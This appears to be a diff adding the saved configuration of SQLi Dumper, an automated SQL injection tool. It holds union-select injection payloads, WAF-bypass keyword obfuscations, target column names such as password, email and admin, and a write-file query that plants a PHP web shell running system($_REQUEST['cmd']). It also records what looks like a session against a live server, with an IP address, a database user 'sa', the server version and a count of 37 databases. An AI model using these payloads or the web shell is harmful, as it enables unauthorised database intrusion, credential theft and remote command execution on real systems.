@@ -1,0 +1,461 @@
+﻿<?xml version="1.0" encoding="UTF-8"?>
+<SQLi_Dumper>
+  <Section Name="LIC">
+    <Key Name="KEY" Value="FR5724C5DC635C848913AB310E60FEA8B861C9CF57" />
+  </Section>
+  <Section Name="frmScanner">
+    <Key Name="txtSearchAPI_19" Value="" />
+    <Key Name="txtAnalizerUnion5" Value="999999.9&quot; union all select [t] and &quot;0&quot;=&quot;0" />
+    <Key Name="chkMultiSearch_6" Value="True" />
+    <Key Name="txtAnalizerUnion6" Value="999999.9) union all select [t] and (0=0" />
+    <Key Name="txtAnalizerUnion3" Value="999999.9 union all select [t]--" />
+    <Key Name="chkAnalizeAlexa" Value="True" />
+    <Key Name="chkMultiSearch_8" Value="True" />
+    <Key Name="grbInjectables" Value="True" />
+    <Key Name="chkAnalizeColumnsCurrDB" Value="True" />
+    <Key Name="numSearchDelay" Value="1000" />
+    <Key Name="txtSearchAPI_9" Value="" />
+    <Key Name="chkInjectableCheckColumns1" Value="True" />
+    <Key Name="chkMultiSearch_10" Value="True" />
+    <Key Name="chkInjectableCheckColumns4" Value="False" />
+    <Key Name="txtSearchAPI_7" Value="" />
+    <Key Name="txtSearchAPI_2" Value="" />
+    <Key Name="txtSearchAPI_14" Value="" />
+    <Key Name="txtInjectableCheckColumns3" Value="password" />
+    <Key Name="txtSearchAPI_18" Value="" />
+    <Key Name="chkMultiSearch_1" Value="True" />
+    <Key Name="txtSearchAPI_16" Value="" />
+    <Key Name="chkAnalizerMySQLErrorUnion" Value="True" />
+    <Key Name="txtSearchAPI_12" Value="" />
+    <Key Name="chkMultiSearch_3" Value="True" />
+    <Key Name="chkMultiSearch_5" Value="True" />
+    <Key Name="txtSearchAPI_8" Value="" />
+    <Key Name="chkInjectableCheckColumns3" Value="False" />
+    <Key Name="txtSearchAPI_6" Value="" />
+    <Key Name="txtSearchSummary" Value="URL's Loaded&#xD;&#xA;[20%] Yandex: 1&#xD;&#xA;[20%] Ask: 7&#xD;&#xA;&#xD;&#xA;Duplicates&#xD;&#xA;&#xD;&#xA;Total: 8&#xD;&#xA;Skiped: 0&#xD;&#xA;Valid Added: 8&#xD;&#xA;&#xD;&#xA;Elapsed: 00.00:00:02&#xD;&#xA;" />
+    <Key Name="txtSearchAPI_1" Value="inurl:" />
+    <Key Name="txtAnalizerUnion4" Value="999999.9' union all select [t] and '0'='0--" />
+    <Key Name="chkMultiSearch_7" Value="True" />
+    <Key Name="txtAnalizerUnion1" Value="999999.9 union all select [t]" />
+    <Key Name="chkAnalizerIntencive" Value="False" />
+    <Key Name="txtInjectableCheckColumns4" Value="user" />
+    <Key Name="txtAnalizerUnion2" Value="999999.9' union all select [t] and '0'='0" />
+    <Key Name="txtSearchAPI_10" Value="" />
+    <Key Name="txtInjectableCheckColumns2" Value="admin" />
+    <Key Name="txtExcludeUrlWords" Value="showthread;injection;dorks;union;hack;.gov" />
+    <Key Name="chkMultiSearch_9" Value="True" />
+    <Key Name="chkAnalizerUnion4" Value="False" />
+    <Key Name="chkAnalizerUnion5" Value="False" />
+    <Key Name="chkAnalizerUnion6" Value="False" />
+    <Key Name="numAnalizerUnionSart" Value="1" />
+    <Key Name="chkAnalizerUnion3" Value="True" />
+    <Key Name="chkAnalizerUnion2" Value="True" />
+    <Key Name="chkAnalizerUnion1" Value="True" />
+    <Key Name="txtSearchAPI_15" Value="" />
+    <Key Name="txtMultiDorks" Value="DORK&#xD;&#xA;" />
+    <Key Name="chkAnalizeLoad_File" Value="True" />
+    <Key Name="txtSearchAPI_11" Value="" />
+    <Key Name="grbSearchColumns" Value="True" />
+    <Key Name="chkAnalizerMSSQLErrorUnion" Value="False" />
+    <Key Name="chkAnalizeWrite_File" Value="True" />
+    <Key Name="cmbInjectableSearchType" Value="Columns" />
+    <Key Name="txtSearchAPI_17" Value="" />
+    <Key Name="txtSearchAPI_13" Value="" />
+    <Key Name="chkInjectableCheckColumns2" Value="False" />
+    <Key Name="txtSearchAPI_5" Value="" />
+    <Key Name="chkMultiSearch_2" Value="True" />
+    <Key Name="txtSearchAPI_3" Value="" />
+    <Key Name="numAnalizerUnionEnd" Value="35" />
+    <Key Name="txtInjectableCheckColumns1" Value="email" />
+    <Key Name="txtSearchAPI_20" Value="" />
+    <Key Name="txtSearchAPI_4" Value="" />
+    <Key Name="chkMultiSearch_4" Value="True" />
+    <Key Name="__cThreadsScanner" Value="1" />
+    <Key Name="__cThreadsExploiter" Value="30" />
+    <Key Name="__cThreadsAnalizer" Value="10" />
+    <Key Name="grbBack" Value="False" />
+  </Section>
+  <Section Name="frmAnalizer">
+    <Key Name="txtAnalizerUnion7" Value="999999.9 union all select [t] #" />
+    <Key Name="numSQLi" Value="1" />
+    <Key Name="txtReqHeaders" Value="" />
+    <Key Name="chkUnionInMSSQLError" Value="False" />
+    <Key Name="txtURL_Builded" Value="" />
+    <Key Name="grbRequest" Value="True" />
+    <Key Name="txtAnalizerMethod" Value="" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="grbHeaders" Value="True" />
+    <Key Name="rdbAnalizerInject4" Value="False" />
+    <Key Name="rdbAnalizerInject3" Value="False" />
+    <Key Name="rdbType_2" Value="False" />
+    <Key Name="cmbMethod" Value="GET" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="tkbAnalizerThreads" Value="5" />
+    <Key Name="numAnalizerUnionEnd" Value="20" />
+    <Key Name="txtReqCookies" Value="" />
+    <Key Name="grbSQLi" Value="True" />
+    <Key Name="cmbAnalizerType" Value="Automatic" />
+    <Key Name="txtRequest" Value="" />
+    <Key Name="chkIEBrowser" Value="True" />
+    <Key Name="grbAnalizer" Value="True" />
+    <Key Name="grbCookies" Value="True" />
+    <Key Name="txtPost" Value="" />
+    <Key Name="numAnalizerUnionSart" Value="1" />
+    <Key Name="txtCookies" Value="" />
+    <Key Name="chkConvertHex" Value="False" />
+    <Key Name="txtAnalizerUnion8" Value="999999.9' union all select [t] and '0'='0 #" />
+    <Key Name="txtAnalizerUnion5" Value="999999.9&quot; union all select [t] and &quot;0&quot;=&quot;0" />
+    <Key Name="txtAnalizerUnion4" Value="999999.9' union all select [t] and '0'='0--" />
+    <Key Name="txtAnalizerUnion6" Value="999999.9) union all select [t] and (0=0" />
+    <Key Name="txtAnalizerUnion1" Value="999999.9 union all select [t]" />
+    <Key Name="rdbAnalizerInject1" Value="True" />
+    <Key Name="txtAnalizerUnion3" Value="999999.9 union all select [t]--" />
+    <Key Name="txtAnalizerUnion2" Value="999999.9' union all select [t] and '0'='0" />
+    <Key Name="chkAnalizerUnion5" Value="False" />
+    <Key Name="chkAnalizerUnion3" Value="True" />
+    <Key Name="chkAnalizerUnion2" Value="True" />
+    <Key Name="chkUnionInMySQLError" Value="True" />
+    <Key Name="chkAnalizerUnion6" Value="False" />
+    <Key Name="chkAnalizerUnion7" Value="False" />
+    <Key Name="chkAnalizerUnion4" Value="True" />
+    <Key Name="rdbAnalizerInject2" Value="False" />
+    <Key Name="chkUnionKeyword" Value="True" />
+    <Key Name="txtCustom" Value="~SQLI:[t]~" />
+    <Key Name="chkAnalizerUnion1" Value="True" />
+    <Key Name="txtAnalizerTraject" Value="http://127.0.0.1/" />
+    <Key Name="chkAnalizerUnion8" Value="False" />
+    <Key Name="cmbSQLi" Value="union all select [t]" />
+    <Key Name="chkErrorBasead" Value="True" />
+    <Key Name="grbHTTP" Value="False" />
+    <Key Name="rdbType_1" Value="True" />
+    <Key Name="rdbType_3" Value="False" />
+    <Key Name="txtURL" Value="http://127.0.0.1/" />
+    <Key Name="chkTraject" Value="False" />
+    <Key Name="rdbAnalizerInject5" Value="False" />
+    <Key Name="chkLogin" Value="False" />
+    <Key Name="chkUnionInteger" Value="True" />
+  </Section>
+  <Section Name="frmDumpArea">
+    <Key Name="txtUserName" Value="" />
+    <Key Name="chkThreads" Value="False" />
+    <Key Name="numTimeOut" Value="5000" />
+    <Key Name="chkDumpWhere" Value="False" />
+    <Key Name="txtPost" Value="" />
+    <Key Name="numLimitY" Value="1" />
+    <Key Name="numLimitX" Value="0" />
+    <Key Name="cmbMethod" Value="GET" />
+    <Key Name="rdbMySQLCollactions1" Value="False" />
+    <Key Name="rdbMySQLCollactions3" Value="False" />
+    <Key Name="tkbThreads" Value="10" />
+    <Key Name="numFieldByField" Value="1" />
+    <Key Name="chkDumpEncodedHex" Value="False" />
+    <Key Name="trwSchema" Value="_Central               [? ]" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="grbOracleTopN" Value="False" />
+    <Key Name="chkMSSQL_Latin1" Value="False" />
+    <Key Name="chkMSSQLCastAsChar" Value="True" />
+    <Key Name="grbMySQLCollactions" Value="False" />
+    <Key Name="rdbMySQLCollactions6" Value="False" />
+    <Key Name="txtSchemaOrderBy" Value="1 asc, 2 desc" />
+    <Key Name="rdbMySQLCollactions2" Value="False" />
+    <Key Name="chkOracleCastAsChar" Value="True" />
+    <Key Name="rdbOracleErrorType2" Value="False" />
+    <Key Name="rdbOracleTopN_2" Value="False" />
+    <Key Name="cmbInjectionPoint" Value="URL" />
+    <Key Name="rdbMySQLCollactions4" Value="False" />
+    <Key Name="grbLimits" Value="False" />
+    <Key Name="chkDumpOrderBy" Value="False" />
+    <Key Name="txtCustomQueryFrom" Value="" />
+    <Key Name="txtCustomQuery" Value="" />
+    <Key Name="rdbOracleTopN_3" Value="False" />
+    <Key Name="txtCookies" Value="" />
+    <Key Name="rdbMySQLErrorType1" Value="True" />
+    <Key Name="rdbMySQLErrorType2" Value="False" />
+    <Key Name="cmbSqlType" Value="MS SQL Error" />
+    <Key Name="chkReDumpFailed" Value="True" />
+    <Key Name="numMaxRetry" Value="5" />
+    <Key Name="rdbOracleTopN_1" Value="True" />
+    <Key Name="grbOracleErrorType" Value="False" />
+    <Key Name="grbMySQLErrorType" Value="False" />
+    <Key Name="rdbMySQLCollactions5" Value="False" />
+    <Key Name="grbOracleCollactions" Value="False" />
+    <Key Name="numSleep" Value="500" />
+    <Key Name="txtSchemaWhere" Value="1=1 or not 1=0" />
+    <Key Name="numLimitMax" Value="0" />
+    <Key Name="rdbMySQLCollactions7" Value="False" />
+    <Key Name="chkDumpFieldByField" Value="False" />
+    <Key Name="rdbMySQLCollactions0" Value="True" />
+    <Key Name="txtURL" Value="http://127.0.0.1/" />
+    <Key Name="rdbOracleErrorType1" Value="True" />
+    <Key Name="grbMSSQLCollactions" Value="False" />
+    <Key Name="chkLogin" Value="False" />
+    <Key Name="chkDumpIFNULL" Value="True" />
+    <Key Name="numMaxRetryColumn" Value="5" />
+    <Key Name="cmbMSSQLCast" Value="nvarchar" />
+    <Key Name="rdbMySQLErrorType3" Value="False" />
+    <Key Name="rdbOracleErrorType3" Value="False" />
+    <Key Name="lblUser" Value="sa" />
+    <Key Name="lblServer" Value="Apache/2.2.6 (Win32) PHP/5.2.5" />
+    <Key Name="lblVersion" Value="Microsoft SQL Server 2012 (SP1" />
+    <Key Name="lblDatabase" Value="_Central" />
+    <Key Name="lblIP" Value="96.11.126.82" />
+    <Key Name="lblCountry" Value="[US] United States" />
+    <Key Name="lblCountBDs" Value="37" />
+  </Section>
+  <Section Name="frmDumpFile">
+    <Key Name="cmbWrite" Value="INTO OUTFILE" />
+    <Key Name="chkConvert" Value="False" />
+    <Key Name="chkUnHexHex" Value="False" />
+    <Key Name="numTimeOut" Value="5000" />
+    <Key Name="cmbConvertPath" Value="SQL Char" />
+    <Key Name="numSleep" Value="100" />
+    <Key Name="GroupContractable1" Value="False" />
+    <Key Name="txtPost" Value="" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="grbLoadFile" Value="False" />
+    <Key Name="txtCookies" Value="" />
+    <Key Name="txtURL" Value="http://127.0.0.1/" />
+    <Key Name="cmbConvert" Value="USING UTF8" />
+    <Key Name="chkLogin" Value="False" />
+    <Key Name="txtWritePath" Value="/tmp/tmp.dat" />
+    <Key Name="chkDumpEncodedHex" Value="True" />
+    <Key Name="txtWriteQuery" Value="'&lt;? system($_REQUEST['cmd']); ?&gt;'" />
+    <Key Name="grbScanner" Value="True" />
+    <Key Name="cmbConcat" Value="CONCAT()" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="grbSetup" Value="False" />
+    <Key Name="chkConvertPath" Value="True" />
+    <Key Name="cmbMethod" Value="GET" />
+  </Section>
+  <Section Name="frmTools">
+    <Key Name="txtOfsKey5" Value="%2f**%2fdIsTiNcT" />
+    <Key Name="txtOfsKey15" Value="%2f**%2fgRoUp%2f**%2fbY" />
+    <Key Name="lblOfsKey34" Value="USER()" />
+    <Key Name="txtRemDuplicatesOut" Value="" />
+    <Key Name="txtOfsKey38" Value="vErSiOn()" />
+    <Key Name="lblOfsKey55" Value="TABLES" />
+    <Key Name="txtOfsKey58" Value="tAbLe_sChEmA" />
+    <Key Name="txtRemDuplicatesAddStringEnd" Value="" />
+    <Key Name="chkMusic" Value="False" />
+    <Key Name="txtOfsKey37" Value="%2f**%2fsYsTeM_UsEr" />
+    <Key Name="lblOfsKey16" Value="SUBSTRING" />
+    <Key Name="txtOfsKey32" Value="uNhEx(" />
+    <Key Name="cmbProxiesTypeCheck" Value="Use proxy by random" />
+    <Key Name="lblOfsKey49" Value="`INFORMATION_SCHEMA`" />
+    <Key Name="txtTextValue" Value="" />
+    <Key Name="txtOfsKey65" Value="%2f**%2fcOlUmN_ScHeMa" />
+    <Key Name="txtNotepad" Value="" />
+    <Key Name="lblOfsKey48" Value="`INFORMATION_SCHEMA`" />
+    <Key Name="txtOfsKey60" Value="cOlUmNs" />
+    <Key Name="txtDomain" Value="" />
+    <Key Name="rdbProxy_1" Value="False" />
+    <Key Name="txtUserAgent" Value="Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)" />
+    <Key Name="txtOfsKey10" Value="lImIt" />
+    <Key Name="lblOfsKey26" Value="CONVERT" />
+    <Key Name="txtResolveIP" Value="" />
+    <Key Name="lblOfsKey45" Value="DB_NAME()" />
+    <Key Name="lblOfsKey19" Value="CONCAT" />
+    <Key Name="lblOfsKey67" Value="MASTER" />
+    <Key Name="txtOfsKey19" Value="%2f**%2fcOnCaT(" />
+    <Key Name="lblOfsKey70" Value="SYSOBJECTS" />
+    <Key Name="lblOfsKey59" Value="TABLE_SCHEMA" />
+    <Key Name="lblOfsKey57" Value="TABLE_NAME" />
+    <Key Name="lblOfsKey33" Value="UNHEX" />
+    <Key Name="txtOfsKey57" Value="%2f**%2ftAbLe_nAmE" />
+    <Key Name="lblOfsKey52" Value="SCHEMA_NAME" />
+    <Key Name="lblOfsKey13" Value="ORDER BY" />
+    <Key Name="txtDumpKey" Value="!~!" />
+    <Key Name="txtOfsKey36" Value="sYsTeM_UsEr" />
+    <Key Name="txtOfsKey52" Value="sChEmA_NaMe" />
+    <Key Name="chkRemDuplicatesReplace" Value="False" />
+    <Key Name="txtRemDuplicatesReplace" Value="" />
+    <Key Name="numHttpRetry" Value="5" />
+    <Key Name="txtOfsKey4" Value="dIsTiNcT" />
+    <Key Name="tkbThreads" Value="10" />
+    <Key Name="txtOfsKey21" Value="%2f**%2fcOnCaT_Ws(" />
+    <Key Name="txtOfsKey48" Value="`InFoRmAtIoN_ScHeMa`" />
+    <Key Name="txtOfsKey64" Value="cOlUmN_ScHeMa" />
+    <Key Name="lblOfsKey4" Value="DISTINCT" />
+    <Key Name="chkCryptoKey" Value="False" />
+    <Key Name="lblOfsKey62" Value="COLUMN_NAME" />
+    <Key Name="txtOfsKey1" Value="%2f**%2fuNiOn%2f**%2faLl" />
+    <Key Name="lblOfsKey73" Value="SYSCOLUMNS" />
+    <Key Name="txtOfsKey71" Value="%2f**%2fsYsObJeCtS" />
+    <Key Name="lblOfsKey18" Value="CONCAT" />
+    <Key Name="txtOfsKey59" Value="%2f**%2ftAbLe_sChEmA" />
+    <Key Name="lblOfsKey17" Value="SUBSTRING" />
+    <Key Name="txtOfsKey18" Value="cOnCaT(" />
+    <Key Name="lblOfsKey37" Value="SYSTEM_USER" />
+    <Key Name="lblOfsKey1" Value="UNION ALL" />
+    <Key Name="txtProxyURL" Value="" />
+    <Key Name="lblOfsKey56" Value="TABLE_NAME" />
+    <Key Name="lblOfsKey32" Value="UNHEX" />
+    <Key Name="chkURLReplaceSpaces" Value="True" />
+    <Key Name="txtOfsKey56" Value="tAbLe_nAmE" />
+    <Key Name="numTimeOut" Value="5000" />
+    <Key Name="lblOfsKey41" Value="@@VERSION" />
+    <Key Name="txtExtention" Value="php;asp" />
+    <Key Name="txtURL" Value="http://localhost/" />
+    <Key Name="txtOfsKey6" Value="fRoM" />
+    <Key Name="txtOfsKey25" Value="%2f**%2flOaD_FiLe(" />
+    <Key Name="txtOfsKey41" Value="%2f**%2f@@vErSiOn" />
+    <Key Name="lblOfsKey28" Value="CAST" />
+    <Key Name="txtOfsKey68" Value="sYsDaTaBaSeS" />
+    <Key Name="txtOfsKey20" Value="cOnCaT_Ws(" />
+    <Key Name="lblOfsKey63" Value="COLUMN_NAME" />
+    <Key Name="lblOfsKey2" Value="SELECT" />
+    <Key Name="lblOfsKey53" Value="SCHEMA_NAME" />
+    <Key Name="lblOfsKey66" Value="MASTER" />
+    <Key Name="txtProxyCountry" Value="" />
+    <Key Name="txtRemDuplicatesAddString" Value="" />
+    <Key Name="txtOfsKey63" Value="%2f**%2fcOlUmN_NaMe" />
+    <Key Name="lblOfsKey11" Value="LIMIT" />
+    <Key Name="cmbSQLChar" Value="Char" />
+    <Key Name="chkRemDuplicatesReplaceNewLine" Value="False" />
+    <Key Name="txtOfsKey70" Value="sYsObJeCtS" />
+    <Key Name="txtRemDuplicatesIn" Value="" />
+    <Key Name="txtOfsKey17" Value="%2f**%2fsUbStRiNg(" />
+    <Key Name="lblOfsKey36" Value="SYSTEM_USER" />
+    <Key Name="txtSplitKey" Value="3!P" />
+    <Key Name="txtOfsKey12" Value="oRdEr bY" />
+    <Key Name="lblOfsKey21" Value="CONCAT_WS" />
+    <Key Name="lblOfsKey69" Value="SYSDATABASES" />
+    <Key Name="txtWordDic" Value="\DIC\dic_admin.txt" />
+    <Key Name="txtOfsKey51" Value="%2f**%2fsChEmAtA" />
+    <Key Name="txtOfsKey29" Value="%2f**%2fcAsT(" />
+    <Key Name="txtOfsKey8" Value="wHeRe" />
+    <Key Name="txtOfsKey45" Value="%2f**%2fdB_NaMe()" />
+    <Key Name="lblOfsKey40" Value="@@VERSION" />
+    <Key Name="chkRemDuplicatesAddStringEnd" Value="False" />
+    <Key Name="txtOfsKey24" Value="lOaD_FiLe(" />
+    <Key Name="txtOfsKey40" Value="@@vErSiOn" />
+    <Key Name="chkGroupChar" Value="True" />
+    <Key Name="lblOfsKey8" Value="WHERE" />
+    <Key Name="txtOfsKey67" Value="%2f**%2fmAsTeR" />
+    <Key Name="chkHTTPAllowAutoRedirect" Value="True" />
+    <Key Name="lblOfsKey65" Value="COLUMN_SCHEMA" />
+    <Key Name="lblOfsKey39" Value="VERSION()" />
+    <Key Name="txtLFPassword" Value="" />
+    <Key Name="txtOfsKey31" Value="%2f**%2fhEx(" />
+    <Key Name="lblOfsKey10" Value="LIMIT" />
+    <Key Name="lblOfsKey58" Value="TABLE_SCHEMA" />
+    <Key Name="txtOfsKey14" Value="gRoUp bY" />
+    <Key Name="chkHTTPEncondingParams" Value="False" />
+    <Key Name="lblOfsKey5" Value="DISTINCT" />
+    <Key Name="lblOfsKey72" Value="SYSCOLUMNS" />
+    <Key Name="cmbURLReplaceSpaces" Value="+" />
+    <Key Name="chkRemDuplicates" Value="True" />
+    <Key Name="lblOfsKey15" Value="GROUP BY" />
+    <Key Name="txtOfsKey16" Value="sUbStRiNg(" />
+    <Key Name="lblOfsKey35" Value="USER()" />
+    <Key Name="txtLFUserName" Value="" />
+    <Key Name="txtResolveAddress" Value="" />
+    <Key Name="txtResolveCountry" Value="" />
+    <Key Name="txtOfsKey2" Value="sElEcT" />
+    <Key Name="txtOfsKey49" Value="%2f**%2f`InFoRmAtIoN_ScHeMa`" />
+    <Key Name="lblOfsKey44" Value="DB_NAME()" />
+    <Key Name="lblOfsKey20" Value="CONCAT_WS" />
+    <Key Name="lblOfsKey68" Value="SYSDATABASES" />
+    <Key Name="txtHexValue" Value="" />
+    <Key Name="txtOfsKey28" Value="cAsT(" />
+    <Key Name="cmbDumpKey" Value="Hex" />
+    <Key Name="lblOfsKey6" Value="FROM" />
+    <Key Name="txtOfsKey23" Value="%2f**%2fgRoUp_cOnCaT(" />
+    <Key Name="chkGUIHotKey" Value="False" />
+    <Key Name="txtOfsKey11" Value="%2f**%2flImIt" />
+    <Key Name="txtOfsKey66" Value="mAsTeR" />
+    <Key Name="lblOfsKey51" Value="SCHEMATA" />
+    <Key Name="txtProxies" Value="" />
+    <Key Name="txtOfsKey7" Value="%2f**%2ffRoM" />
+    <Key Name="txtOfsKey35" Value="%2f**%2fuSeR()" />
+    <Key Name="chkScannerSaveTXT" Value="True" />
+    <Key Name="lblOfsKey38" Value="VERSION()" />
+    <Key Name="txtRemDuplicatesReplaceLine" Value="" />
+    <Key Name="txtOfsKey30" Value="hEx(" />
+    <Key Name="txtRemDuplicatesReplaceTo" Value="" />
+    <Key Name="lblOfsKey3" Value="SELECT" />
+    <Key Name="txtOfsKey73" Value="%2f**%2fsYsCoLuMnS" />
+    <Key Name="chkStopScannDetected" Value="True" />
+    <Key Name="lblOfsKey61" Value="COLUMNS" />
+    <Key Name="lblOfsKey14" Value="GROUP BY" />
+    <Key Name="lblOfsKey24" Value="LOAD_FILE" />
+    <Key Name="txtOfsKey13" Value="%2f**%2foRdEr%2f**%2fbY" />
+    <Key Name="cmbCharacterCasing" Value="upper" />
+    <Key Name="lblOfsKey43" Value="DATABASE()" />
+    <Key Name="txtCryptoKey" Value="sqli_dumper_crypto_key" />
+    <Key Name="txtOfsKey27" Value="%2f**%2fcOnVeRt(" />
+    <Key Name="chkRemDuplicatesAddStringFNumber" Value="False" />
+    <Key Name="txtOfsKey43" Value="%2f**%2fdAtAbAsE()" />
+    <Key Name="chkCharacterCasing" Value="False" />
+    <Key Name="numHttpDelay" Value="100" />
+    <Key Name="txtOfsKey22" Value="gRoUp_cOnCaT(" />
+    <Key Name="lblOfsKey31" Value="HEX" />
+    <Key Name="txtOfsKey39" Value="%2f**%2fvErSiOn()" />
+    <Key Name="txtOfsKey9" Value="%2f**%2fwHeRe" />
+    <Key Name="txtOfsKey55" Value="%2f**%2ftAbLeS" />
+    <Key Name="lblOfsKey50" Value="SCHEMATA" />
+    <Key Name="chkRemDuplicatesReplaceLine" Value="False" />
+    <Key Name="txtOfsKey34" Value="uSeR()" />
+    <Key Name="txtOfsKey50" Value="sChEmAtA" />
+    <Key Name="lblOfsKey9" Value="WHERE" />
+    <Key Name="lblOfsKey29" Value="CAST" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="txtOfsKey44" Value="dB_NaMe()" />
+    <Key Name="txtOfsKey72" Value="sYsCoLuMnS" />
+    <Key Name="txtSQLCharDelimiter" Value="+" />
+    <Key Name="txtOfsKey69" Value="%2f**%2fsYsDaTaBaSeS" />
+    <Key Name="lblOfsKey60" Value="COLUMNS" />
+    <Key Name="chkProxyEnable" Value="False" />
+    <Key Name="txtOfsKey53" Value="%2f**%2fsChEmA_NaMe" />
+    <Key Name="chkRemDuplicatesSort" Value="True" />
+    <Key Name="lblOfsKey47" Value="MYSQL" />
+    <Key Name="lblOfsKey23" Value="GROUP_CONCAT" />
+    <Key Name="cmbWAFS" Value="WAF Bypassing" />
+    <Key Name="txtOfsKey62" Value="cOlUmN_NaMe" />
+    <Key Name="txtOfsKey47" Value="%2f**%2fmYsQl" />
+    <Key Name="lblOfsKey42" Value="DATABASE()" />
+    <Key Name="txtOfsKey26" Value="cOnVeRt(" />
+    <Key Name="grbSetupAdmin" Value="False" />
+    <Key Name="txtOfsKey42" Value="dAtAbAsE()" />
+    <Key Name="rdbProxy_2" Value="True" />
+    <Key Name="cmbCryptoKey" Value="RijnDael" />
+    <Key Name="txtOfsKey3" Value="%2f**%2fsElEcT" />
+    <Key Name="txtProxyCountryCode" Value="" />
+    <Key Name="lblOfsKey54" Value="TABLES" />
+    <Key Name="lblOfsKey30" Value="HEX" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="chkSysTray" Value="False" />
+    <Key Name="txtOfsKey54" Value="tAbLeS" />
+    <Key Name="lblOfsKey7" Value="FROM" />
+    <Key Name="txtProxyServer" Value="" />
+    <Key Name="numHttpTimeOut" Value="10000" />
+    <Key Name="txtOfsKey33" Value="%2f**%2fuNhEx(" />
+    <Key Name="lblOfsKey12" Value="ORDER BY" />
+    <Key Name="txtSQLCharValue" Value="" />
+    <Key Name="lblOfsKey25" Value="LOAD_FILE" />
+    <Key Name="txtOfsKey0" Value="uNiOn aLl" />
+    <Key Name="lblOfsKey64" Value="COLUMN_SCHEMA" />
+    <Key Name="lblOfsKey27" Value="CONVERT" />
+    <Key Name="lblOfsKey0" Value="UNION ALL" />
+    <Key Name="chkLogin" Value="False" />
+    <Key Name="chkShowIP" Value="False" />
+    <Key Name="lblOfsKey46" Value="MYSQL" />
+    <Key Name="lblOfsKey22" Value="GROUP_CONCAT" />
+    <Key Name="cmbGUIHotKey" Value="A" />
+    <Key Name="txtOfsKey61" Value="%2f**%2fcOlUmNs" />
+    <Key Name="txtOfsKey46" Value="mYsQl" />
+    <Key Name="lblOfsKey71" Value="SYSOBJECTS" />
+    <Key Name="chkRemDuplicatesAddString" Value="False" />
+  </Section>
+  <Section Name="frmDumpGridExporter">
+    <Key Name="LastPath" Value="" />
+    <Key Name="rdpType_1" Value="True" />
+    <Key Name="rdpType_2" Value="False" />
+    <Key Name="rdpType_3" Value="False" />
+    <Key Name="chkReplaceLines" Value="True" />
+    <Key Name="txtReplaceLine" Value="{NewLine}" />
+    <Key Name="rdbOpt2" Value="False" />
+    <Key Name="txtDeli" Value=":" />
+    <Key Name="rdbOpt1" Value="True" />
+  </Section>
+</SQLi_Dumper>
